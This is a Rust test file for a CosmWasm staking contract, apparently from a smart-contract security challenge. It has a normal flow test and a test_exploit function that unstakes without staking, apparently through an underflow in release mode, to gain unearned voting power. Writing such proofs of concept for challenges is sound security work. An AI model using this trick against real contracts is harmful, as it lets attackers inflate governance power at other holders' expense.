#[cfg(test)]
pub mod tests {
    use crate::{
        contract::{DENOM, LOCK_PERIOD},
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::UserInfo,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // cannot stake more than deposited
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // cannot unstake before maturity
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // cannot withdraw while staked
        let msg = ExecuteMsg::Withdraw { amount };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // normal unstake
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // no more voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, 0_u128);

        // normal withdraw
        let msg = ExecuteMsg::Withdraw { amount };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // funds are received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, amount);
    }

    //@note this exploit is only successful when testing in release mode
    #[test]
    fn test_exploit(){
        let (mut app, contract_addr) = proper_instantiate(); 

        //user needs just one token to do this
        app = mint_tokens(app, USER.to_string(), Uint128::new(1));
        println!("depositing nothing to make a record in VOTING_POWER");
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &vec![coin(1, DENOM)]
        ).unwrap();

        //fast forward by lock period
        //println!("one day goes by");
        //app.update_block(
        //    |block_info| {
        //        block_info.time = block_info.time.plus_seconds(LOCK_PERIOD);
        //    }
        //);

        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Unstake {
                unlock_amount: 1
            },
            &vec![]
        ).unwrap();


        let new_voting_power: u128 = app.wrap().query_wasm_smart(
            contract_addr.clone(),
            &QueryMsg::GetVotingPower { user: String::from(USER)},
        ).unwrap();
        
        println!("checking if we have nonzero voting power");
        assert!(new_voting_power > 0);
    }
}
